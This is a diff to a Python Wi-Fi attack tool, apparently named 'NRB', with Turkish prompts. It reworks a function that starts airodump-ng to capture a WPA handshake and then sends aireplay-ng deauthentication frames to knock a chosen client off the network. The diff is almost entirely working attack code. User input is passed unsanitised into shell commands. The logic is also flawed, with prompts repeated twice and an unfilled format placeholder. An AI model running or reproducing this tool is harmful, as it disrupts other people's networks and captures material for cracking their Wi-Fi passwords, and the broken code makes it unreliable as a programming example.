@@ -1142,11 +1142,7 @@ def hidden_panel(inputt):
         elif os.name == "nt":
             os.system("cls")
         print(""""
-
-
-
         Developer - NRB
-
         Encryption
         """)
         password23 = str(input("Encrypt:"))
@@ -1188,25 +1184,69 @@ def tor_ip_switcher():
 
 
 def handshake_take():
-    system("clear")
-    system("figlet NRB")
-    system("xterm -sh 500 -e airodump-ng wlan0mon > /dev/null 2>&1 &")
     try:
-        modem_bssid = str(input("Modem bssid:"))
-        channel = int(input("Channel:"))
-        dosya_ismi = str(input("Dosya ismi:"))
-        system("xterm -sh 250 -e airodump-ng --bssid {} --channel {} --write {} wlan0mon > /dev/null 2>&1 &".format(
-            modem_bssid, channel, dosya_ismi))
-        system("clear")
-        system("figlet NRB")
-        target_bssid1 = str(input("Hedef bssid:"))
-        system("xterm -sh 250 -e aireplay-ng --deauth 20 -a {} -c {} wlan0mon".format(modem_bssid, target_bssid1))
-
+        if interface() == "wlan0mon":
+            system("clear")
+            system("figlet NRB")
+            system("xterm -sh 500 -e airodump-ng wlan0mon > /dev/null 2>&1 &")
+            try:
+                modem_bssid = str(input("Modem bssid:"))
+                channel = int(input("Channel:"))
+                dosya_ismi = str(input("Dosya ismi:"))
+                try:
+                    os.chdir("/opt/nrb_wifi_tool/")
+                    if os.path.exists("/opt/nrb_wifi_tool/handshakes/") == True:
+                        try:
+                            os.chdir("/opt/nrb_wifi_tool/handshakes")
+                            modem_bssid = str(input("Modem bssid:"))
+                            channel = int(input("Channel:"))
+                            dosya_ismi = str(input("Dosya ismi:"))
+                            system(
+                                "xterm -sh 250 -e airodump-ng --bssid {} --channel {} --write {} wlan0mon > /dev/null 2>&1 &".format(
+                                    modem_bssid, channel, dosya_ismi))
+                            system("clear")
+                            system("figlet NRB")
+                            target_bssid1 = str(input("Hedef bssid:"))
+                            system("xterm -sh 250 -e aireplay-ng --deauth 20 -a {} -c {} wlan0mon".format(modem_bssid,
+                                                                                                          target_bssid1))
+                        except:
+                            print("{}[!] Directory not found !".format(C))
+                            sleep(5)
+                            pass
+                        finally:
+                            os.chdir("/opt/nrb_wifi_tool/")
+                    elif os.path.exists("/opt/nrb_wifi_tool/handshakes/") == False:
+                        try:
+                            os.mkdir("/opt/nrb_wifi_tool/handshakes/")
+                            modem_bssid = str(input("Modem bssid:"))
+                            channel = int(input("Channel:"))
+                            dosya_ismi = str(input("Dosya ismi:"))
+                            system(
+                                "xterm -sh 250 -e airodump-ng --bssid {} --channel {} --write {} wlan0mon > /dev/null 2>&1 &".format(
+                                    modem_bssid, channel, dosya_ismi))
+                            system("clear")
+                            system("figlet NRB")
+                            target_bssid1 = str(input("Hedef bssid:"))
+                            system("xterm -sh 250 -e aireplay-ng --deauth 20 -a {} -c {} wlan0mon".format(modem_bssid,
+                                                                                                          target_bssid1))
+                        except:
+                            print("{}[!] Directory Error Code:982")
+                            sleep(5)
+                        finally:
+                            os.chdir("/opt/nrb_wifi_tool/")
+                except:
+                    print("{}[!] Directory not found {}".format(C, "/opt/nrb_wifi_tool/"))
+                    sleep(5)
+                    REFURCE_CNT = str(input("press to ENTER continue ...."))
+            except:
+                print("\033[94;1m[!]\033 Bir hata olustu !!")
+                sleep(2)
+        else:
+            print("{}[!] You are not in monitor mode".format(C))
+            sleep(5)
     except:
-        print("\033[94;1m[!]\033 Bir hata olustu !!")
-        sleep(2)
-
-
+        print("{}[!] Error capturing handshake".format(C))
+        sleep(5)
 def dosya_acma(write):
     file = open("bilgiler.txt", "w", encoding="utf-8")
     file.write(write)
